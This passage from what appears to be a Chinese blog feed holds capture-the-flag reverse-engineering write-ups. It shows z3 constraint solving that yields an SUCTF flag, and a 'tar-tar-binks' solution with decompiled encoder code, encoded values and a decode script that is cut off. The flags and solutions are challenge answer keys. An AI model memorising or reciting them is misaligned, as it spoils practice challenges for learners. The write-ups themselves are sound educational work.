c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x12] == ((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5]) - c[6]) + c[7]) -                                                    c[8]) + c[9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[                                                  0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[0x14]) - c[                                              0x15]) - c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) +                                   c[0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) -                             c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x13] == ((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) - c[5]) + c[6]) - c[7]) - c[8]) -                                            c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10]) -                                      c[0x11]) + c[0x12] + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[                                       0x18]) - c[0x19]) + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f] +                               c[0x20] + c[0x21]) - c[0x22]) + c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) + c[0x27] + c[                             0x28]) - c[0x29])solver.add(enc[0x14] == ((((((((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5]) - c[6]) + c[    7]) - c[8]) - c[9]) + c[10] + c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[                                               0x13]) + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) -                                      c[0x1a]) - c[0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) + c[                                   0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28]) -           c[0x29])solver.add(enc[0x15] == (((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5] + c[6] + c[7]) -                                                       c[8]) - c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) -                                                c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[                                              0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b]) -                                     c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[                                  0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x16] == (((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6] + c[7]) - c[8]) + c[    9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe] + c[0xf]) - c[0x10]) + c[0x11] + c[0x12]) - c[0x13]) - c[0x14]) +                                        c[0x15] + c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b]) - c[                                      0x1c]) + c[0x1d] + c[0x1e] + c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) - c[                                 0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0x17] == (((((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) - c[6]) - c[7]) +                                                     c[8]) - c[9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) - c[0xe]) + c[                                                   0xf]) - c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) - c[0x14]) - c[                                              0x15]) + c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b]) -                                    c[0x1c]) + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[                                  0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x18] == (((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[8]) + c[    9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) + c[0x13] + c[0x14] +                                    c[0x15] + c[0x16] + c[0x17] + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) +                                c[0x1d] + c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21] + c[0x22]) - c[0x23]) - c[0x24]) - c[                               0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x19] == ((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5] + c[6]) - c[7]) + c[    8] + c[9] + c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[                                               0x14]) - c[0x15]) + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a]) -                                     c[0x1b]) + c[0x1c]) - c[0x1d]) + c[0x1e]) - c[0x1f]) - c[0x20]) + c[0x21]) - c[                                  0x22]) - c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0x1a] == (((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4]) - c[5]) - c[6]) + c[7]) - c[8]) -                                                c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[                                             0x10]) - c[0x11]) + c[0x12]) - c[0x13]) - c[0x14]) + c[0x15] + c[0x16] + c[                                        0x17] + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) - c[0x1d]) + c[                                   0x1e] + c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) -                         c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1b] == (((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) + c[4]) - c[5]) - c[6]) - c[7]) - c[    8]) - c[9]) - c[10]) - c[0xb]) + c[0xc] + c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13]) - c[                                             0x14]) - c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19] + c[0x1a]) - c[                                        0x1b]) + c[0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[                                   0x22]) + c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x1c] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[    8]) - c[9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[                                             0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) - c[0x1a]) +                                  c[0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) + c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22] +                           c[0x23] + c[0x24]) - c[0x25]) - c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1d] == ((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5] + c[6] + c[7]) - c[8]) +                                            c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe] + c[0xf]) - c[0x10]) +                                     c[0x11] + c[0x12]) - c[0x13]) + c[0x14] + c[0x15] + c[0x16] + c[0x17]) - c[0x18]) +                                 c[0x19] + c[0x1a]) - c[0x1b]) + c[0x1c] + c[0x1d] + c[0x1e] + c[0x1f] + c[0x20]) - c[                                  0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) + c[0x26] + c[0x27]) - c[0x28]) + c[               0x29])solver.add(enc[0x1e] == ((((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) - c[5]) - c[6]) - c[7]) + c[    8] + c[9]) - c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) - c[0x12]) - c[0x13]) +                                        c[0x14]) - c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[                                      0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[                               0x22]) + c[0x23] + c[0x24] + c[0x25]) - c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1f] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3] + c[4]) - c[5]) - c[6]) + c[7] + c[    8] + c[9] + c[10] + c[0xb] + c[0xc]) - c[0xd]) - c[0xe]) - c[0xf]) + c[0x10] + c[0x11] + c[0x12] + c[0x13]) - c[                                                0x14]) + c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) - c[0x19]) + c[                                          0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) + c[                                    0x21]) - c[0x22]) + c[0x23]) - c[0x24]) + c[0x25]) - c[0x26]) + c[0x27]) - c[                             0x28]) - c[0x29])solver.add(enc[0x20] == (((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5] + c[6] + c[7] + c[8]) - c[    9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd] + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] + c[0x14]) -                                       c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) + c[0x19] + c[0x1a] + c[0x1b]) - c[                                      0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22] + c[                                0x23] + c[0x24] + c[0x25]) - c[0x26]) + c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x21] == (((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3] + c[4] + c[5] + c[6]) - c[7]) - c[    8]) + c[9] + c[10] + c[0xb]) - c[0xc]) - c[0xd]) + c[0xe] + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) + c[0x13]) - c[                                              0x14]) + c[0x15] + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[                                          0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[                                   0x22]) - c[0x23]) + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x22] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3]) - c[4]) - c[5]) - c[6]) + c[7] + c[    8] + c[9] + c[10] + c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) + c[0x13]) - c[                                           0x14]) - c[0x15]) + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[                                      0x1b] + c[0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[                                 0x22]) - c[0x23]) - c[0x24]) + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x23] == ((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) - c[6]) + c[7] + c[8]) - c[    9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) - c[0x14]) -                                    c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b] + c[                                   0x1c]) - c[0x1d]) - c[0x1e]) + c[0x1f] + c[0x20]) - c[0x21]) + c[0x22] + c[0x23] + c[                              0x24] + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x24] == (((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) - c[4]) - c[5]) - c[6]) + c[7] + c[8] + c[    9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[                                            0x15]) - c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) -                                 c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) - c[                                0x24]) + c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x25] == ((((((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3]) - c[4]) + c[5]) - c[6]) - c[    7]) - c[8]) - c[9]) + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) + c[0x11] + c[0x12]) - c[                                                 0x13]) - c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) + c[0x18]) - c[                                           0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f]) - c[                                     0x20]) + c[0x21]) - c[0x22]) + c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[                              0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x26] == ((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) + c[5] + c[6] + c[7]) - c[8]) - c[    9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) - c[0x11]) - c[0x12]) - c[0x13]) + c[0x14] +                                     c[0x15]) - c[0x16]) + c[0x17] + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) - c[0x1c]) -                                 c[0x1d]) + c[0x1e] + c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) - c[0x24]) -                          c[0x25]) + c[0x26] + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x27] == (((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) - c[4]) + c[5]) - c[6]) - c[7]) - c[8]) +                                         c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe]) - c[0xf]) - c[0x10]) - c[                                      0x11]) + c[0x12] + c[0x13] + c[0x14] + c[0x15] + c[0x16]) - c[0x17]) + c[0x18] +                               c[0x19] + c[0x1a] + c[0x1b] + c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20] + c[                                 0x21] + c[0x22]) - c[0x23]) - c[0x24]) + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) + c[               0x29])solver.add(enc[0x28] == ((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5] + c[6]) - c[7]) + c[8] + c[    9]) - c[10]) + c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[                                       0x15] + c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b] + c[                                   0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) + c[0x23] + c[                              0x24]) - c[0x25]) + c[0x26] + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x29] == (((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6]) - c[7]) - c[8]) -                                                    c[9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) - c[0xf]) - c[                                                  0x10]) - c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) + c[                                            0x16]) - c[0x17]) - c[0x18]) + c[0x19] + c[0x1a] + c[0x1b] + c[0x1c]) - c[                                        0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) - c[                                 0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])</code></pre><p>这一部分可以直接用脚本来写，把所有的<code>param_1</code>替换并且注意把<code>（uint)</code>和<code>*param_1</code>特殊处理一下就好了</p><p>然后解出为唯一解</p><pre><code class="python">if solver.check() == sat:    r = solver.model()    for i in range(42):        flag.append(r[c[i]].as_long() ^ i)    flag = &#39;&#39;.join(map(lambda x: chr(((x &gt;&gt; 3) | (x &lt;&lt; 5)) &amp; 0xff), flag))    print flag</code></pre><p>直接输出flag</p><pre><code>SUCTF&#123;Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!&#125;</code></pre><p><code>unicorn</code>和<code>z3</code>实在是太好用了，之前<code>b01lersCTF</code>的第一道题我还愚蠢的手解方程，早知道<code>z3</code>一把梭就完了……</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> unicorn </tag>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tar-tar-binks-攻防世界</title>
      <link href="/2020/03/25/tar-tar-binks-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2020/03/25/tar-tar-binks-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<p>tar-tar-binks-攻防世界</p><span id="more"></span><p>IDA打开发现函数很多，发现一个函数<code>base64_encode</code>，尝试对损坏的tar文件里面的部分进行base64解码，找到一串奇怪的字符</p><pre><code>F5D1,4D6B,ED6A,08A6,38DD,F7FA,609E,EBC4,E55F,E6D1,7C89,ED5B,0871,1A69,5D58,72DE,224B,3AA6,0845,7DD6,58FB,E9CC,0A2D,76B8,ED60,251A,1F6B,32CC,E78D,12FA,201A,E889,2D25,922A,4BC5,F5FF,F8E5,C79B,3A77,4BDB,EA11,5941,58BD,3A95,F5C9,A225,AD40,F8BD,095D,70B6,458C,E7A9,EA68,252F,094B,5E41,0969,6015,5ED5,F6E5,59B9,7CAF,66DF,265B,7837,57B4,7CAF,AED9,F707,6A3C,F8E5,F509,7C8B,0915,2235,336F,33E9,2D14,7C91,5804,83E5,E78D,F4EA,0874,ED6B,4B35,E839,57B4,E77C,EA68,2525,AD41,ED6F,3A4A,4BCC,6015,F440,0858,3AA6,7809,671D,0874,EA77,63AF,2E91,5845,F6C4,086D,7795,3939,57B4,7C89,82DC,32ED,B994,C7AF,9135,0E65,1B66,ED5B,3235,6577,5A80,3AD3,E776,1EE5,AD41,ED59,864C,70B4,3876,ED67,64D6,F8E5,F505,EAD9,7C9C,32ED,B994,B4EF,0C6C,F665,F5F5,9047,521A,E99E,EA68,252F,9D09,76B7,E776,1ED0,095D,0D4D,5D5A,087B,2005,1526,7E76,85AD,78B9,E8B6,782C,251C,32ED,7F68,EBE3,EA41,57FD,ED59,846D,7A05,B994,BB78,ED6A,08A6,38DD,3B5D,7E45,E839,738C,E9CC,0A2D,764A,609E,E8B6,EA68,2524,E6BB,7C9C,639F,3A95,0895,F40F,8328,EA69,7EE5,F8BD,7F7D,0D6D,70B6,458C,E8B6,EA68,251C,6065,B35F,C789,5845,7F7D,6D89,4C6E,A20E,60B5,7E45,ED59,F707,69EF,922A,4BC5,F6EF,8635,F4B9,57B4,7CF8,ED60,2510,095D,20AF,3545,F40F,8328,EA41,58A4,225D,7E7C,4BDB,F8BD,082C,EAE7,5D57,5D50,0914,E7C7,8624,7CF8,ED60,2511,7C8E,7159,8416,7EF9,E7E5,774A,3895,1EC9,7C90,09B9,58BD,5FF5,E99E,EA68,250A,224C,EA3D,73F5,7C89,53A6,3190,3B5D,1526,7DD5,666A,0919,225F,CDEF,79E1,7E7B,7E6B,082C,A277,E885,E8BB,E775,5FF7,EA68,251B,7FDF,589D,7A05,779A,8A5A,7C91,5D5C,32ED,F628,2195,F49A,0C77,EAE1,59B9,58BD,E570,E99E,EA3D,73F9,13AD,2BF5,225D,7F7D,70B6,4A9C,337A,1EC9,4D05,7E75,2578,ED59,38E5,1ECA,A210,3B5D,779A,8A6F,C790,2518,4B41,7C89,5D49,4D05,152D,73C5,79F9,4BED,913C,37C9,5D4D,53C8,0941,7C97,5D5B,346A,82D8,5F36,801F,C800,</code></pre><p>最后的一个<code>,</code>很可疑，应该是输出的时候按照固定格式输出的，所以搜索一下字符串</p><p><img src="https://s1.ax1x.com/2020/03/25/8jEkqS.png" alt="tar-tar-binks"></p><p>找到可疑的<code>%04X</code>，查一下交叉引用</p><pre><code class="c++"> v10 = (char *)malloc(0x2710uLL);  __memcpy_chk(v10, a2, v18, -1LL);  if ( v18 &gt; 0x200 )  &#123;    sub_1023457(v10, v18);    v9 = (char *)malloc(0x2710uLL);    __memset_chk(v10, 0LL, 10000LL, -1LL);    v8 = 0;    __memset_chk(v9, 0LL, 10000LL, -1LL);    while ( v8 &lt; posi )    &#123;      v3 = strlen(v9);      __sprintf_chk(&amp;v9[v3], 0, 0xFFFFFFFFFFFFFFFFLL, &quot;%04X,&quot;, sub_101[v8++]);    &#125;    __memcpy_chk(v10, v9, v18, -1LL);  &#125;</code></pre><p>只有在这一处引用了，输出出来的奇怪的16进制数应该是<code>sub_101</code>里面的数，再查看一下<code>sub_101</code>的交叉引用</p><pre><code class="c++">unsigned int *__fastcall sub_1023458(_DWORD *a1)&#123;  unsigned int *result; // rax  int v2; // ST04_4  int v3; // esi  result = sub_101;  v2 = *a1 + 40 * a1[1] + 1600 * a1[2];  v3 = posi++;  sub_101[v3] = v2;  return result;&#125;</code></pre><p>在这里进行了计算并写入，再一次查看交叉引用看看<code>a1</code>是什么</p><pre><code class="c++">__int64 __fastcall sub_1023457(char *a1, int a2)&#123;  int v2; // eax  char *v3; // rax  int v5; // [rsp+4h] [rbp-2Ch]  signed int v6; // [rsp+8h] [rbp-28h]  int v7; // [rsp+Ch] [rbp-24h]  char *v8; // [rsp+10h] [rbp-20h]  int v9[3]; // [rsp+1Ch] [rbp-14h]  v8 = a1;  v7 = a2;  v6 = 3;  while ( 1 )  &#123;    v2 = v7--;    if ( !v2 )      break;    v3 = v8++;    v5 = *v3;    pending = 1;    while ( pending )    &#123;      v9[--v6] = sub_1023456(v5);      if ( !v6 )      &#123;        sub_1023458(v9);        v6 = 3;      &#125;    &#125;  &#125;  if ( v6 != 3 )  &#123;    while ( v6 != -1 )      v9[--v6] = 0;    sub_1023458(v9);  &#125;  return __stack_chk_guard;&#125;</code></pre><p><code>v9</code>每三位进行上面函数的操作，所以看看<code>v9</code>是怎么得到的</p><pre><code class="c++">__int64 __fastcall sub_1023456(int a1)&#123;  int v1; // ST04_4  int i; // [rsp+0h] [rbp-Ch]  int v4; // [rsp+4h] [rbp-8h]  unsigned int v5; // [rsp+8h] [rbp-4h]  v4 = a1;  if ( sub_1023456_shifted == -1 )  &#123;    if ( a1 == 126 )      v4 = 0;    for ( i = 0; i &lt; 39; ++i )    &#123;      if ( ctable[i] == v4 )      &#123;        pending = 0;        return (unsigned int)i;      &#125;      if ( ctable[i + 39] == v4 )      &#123;        pending = 1;        sub_1023456_shifted = i;        return 39;      &#125;    &#125;    pending = 0;    v5 = 37;  &#125;  else  &#123;    v1 = sub_1023456_shifted;    sub_1023456_shifted = -1;    pending = 0;    v5 = v1;  &#125;  return v5;&#125;</code></pre><p>有一个字母表<code>ctable</code>，找到其中的索引，39以下直接返回索引值，39往上返回值分为两部分，一部分是39，另一部分是索引值<code>i</code>，之所以这么做其实是为了降低难度，使前面的三元一次方程有唯一解，把整个过程逆过来就得到了真正的<code>flag.txt</code></p><p><del>这里用来批评攻防世界，题目明明有说明最后使md5值怎么到这就没了</del></p><pre><code class="python">target = [0xF5D1, 0x4D6B, 0xED6A, 0x08A6, 0x38DD, 0xF7FA, 0x609E, 0xEBC4, 0xE55F, 0xE6D1, 0x7C89, 0xED5B, 0x0871,          0x1A69, 0x5D58, 0x72DE, 0x224B, 0x3AA6, 0x0845, 0x7DD6, 0x58FB, 0xE9CC, 0x0A2D, 0x76B8, 0xED60, 0x251A,          0x1F6B, 0x32CC, 0xE78D, 0x12FA, 0x201A, 0xE889, 0x2D25, 0x922A, 0x4BC5, 0xF5FF, 0xF8E5, 0xC79B, 0x3A77,          0x4BDB, 0xEA11, 0x5941, 0x58BD, 0x3A95, 0xF5C9, 0xA225, 0xAD40, 0xF8BD, 0x095D, 0x70B6, 0x458C, 0xE7A9,          0xEA68, 0x252F, 0x094B, 0x5E41, 0x0969, 0x6015, 0x5ED5, 0xF6E5, 0x59B9, 0x7CAF, 0x66DF, 0x265B, 0x7837,          0x57B4, 0x7CAF, 0xAED9, 0xF707, 0x6A3C, 0xF8E5, 0xF509, 0x7C8B, 0x0915, 0x2235, 0x336F, 0x33E9, 0x2D14,          0x7C91, 0x5804, 0x83E5, 0xE78D, 0xF4EA, 0x0874, 0xED6B, 0x4B35, 0xE839, 0x57B4, 0xE77C, 0xEA68, 0x2525,          0xAD41, 0xED6F, 0x3A4A, 0x4BCC, 0x6015, 0xF440, 0x0858, 0x3AA6, 0x7809, 0x671D, 0x0874, 0xEA77, 0x63AF,          0x2E91, 0x5845, 0xF6C4, 0x086D, 0x7795, 0x3939, 0x57B4, 0x7C89, 0x82DC, 0x32ED, 0xB994, 0xC7AF, 0x9135,          0x0E65, 0x1B66, 0xED5B, 0x3235, 0x6577, 0x5A80, 0x3AD3, 0xE776, 0x1EE5, 0xAD41, 0xED59, 0x864C, 0x70B4,          0x3876, 0xED67, 0x64D6, 0xF8E5, 0xF505, 0xEAD9, 0x7C9C, 0x32ED, 0xB994, 0xB4EF, 0x0C6C, 0xF665, 0xF5F5,          0x9047, 0x521A, 0xE99E, 0xEA68, 0x252F, 0x9D09, 0x76B7, 0xE776, 0x1ED0, 0x095D, 0x0D4D, 0x5D5A, 0x087B,          0x2005, 0x1526, 0x7E76, 0x85AD, 0x78B9, 0xE8B6, 0x782C, 0x251C, 0x32ED, 0x7F68, 0xEBE3, 0xEA41, 0x57FD,          0xED59, 0x846D, 0x7A05, 0xB994, 0xBB78, 0xED6A, 0x08A6, 0x38DD, 0x3B5D, 0x7E45, 0xE839, 0x738C, 0xE9CC,          0x0A2D, 0x764A, 0x609E, 0xE8B6, 0xEA68, 0x2524, 0xE6BB, 0x7C9C, 0x639F, 0x3A95, 0x0895, 0xF40F, 0x8328,          0xEA69, 0x7EE5, 0xF8BD, 0x7F7D, 0x0D6D, 0x70B6, 0x458C, 0xE8B6, 0xEA68, 0x251C, 0x6065, 0xB35F, 0xC789,          0x5845, 0x7F7D, 0x6D89, 0x4C6E, 0xA20E, 0x60B5, 0x7E45, 0xED59, 0xF707, 0x69EF, 0x922A, 0x4BC5, 0xF6EF,          0x8635, 0xF4B9, 0x57B4, 0x7CF8, 0xED60, 0x2510, 0x095D, 0x20AF, 0x3545, 0xF40F, 0x8328, 0xEA41, 0x58A4,          0x225D, 0x7E7C, 0x4BDB, 0xF8BD, 0x082C, 0xEAE7, 0x5D57, 0x5D50, 0x0914, 0xE7C7, 0x8624, 0x7CF8, 0xED60,          0x2511, 0x7C8E, 0x7159, 0x8416, 0x7EF9, 0xE7E5, 0x774A, 0x3895, 0x1EC9, 0x7C90, 0x09B9, 0x58BD, 0x5FF5,          0xE99E, 0xEA68, 0x250A, 0x224C, 0xEA3D, 0x73F5, 0x7C89, 0x53A6, 0x3190, 0x3B5D, 0x1526, 0x7DD5, 0x666A,          0x0919, 0x225F, 0xCDEF, 0x79E1, 0x7E7B, 0x7E6B, 0x082C, 0xA277, 0xE885, 0xE8BB, 0xE775, 0x5FF7, 0xEA68,          0x251B, 0x7FDF, 0x589D, 0x7A05, 0x779A, 0x8A5A, 0x7C91, 0x5D5C, 0x32ED, 0xF628, 0x2195, 0xF49A, 0x0C77,          0xEAE1, 0x59B9, 0x58BD, 0xE570, 0xE99E, 0xEA3D, 0x73F9, 0x13AD, 0x2BF5, 0x225D, 0x7F7D, 0x70B6, 0x4A9C,          0x337A, 0x1EC9, 0x4D05, 0x7E75, 0x2578, 0xED59, 0x38E5, 0x1ECA, 0xA210, 0x3B5D, 0x779A, 0x8A6F, 0xC790,          0x2518, 0x4B41, 0x7C89, 0x5D49, 0x4D05, 0x152D, 0x73C5, 0x79F9, 0x4BED, 0x913C, 0x37C9, 0x5D4D, 0x53C8,          0x0941, 0x7C97, 0x5D5B, 0x346A, 0x82D8, 0x5F36, 0x801F, 0xC800]ctable = [    0x00, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,    0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73,    0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32,    0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x20, 0x0A, 0x00,    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,    0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54,    0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x28, 0x21, 0x40, 0x23,    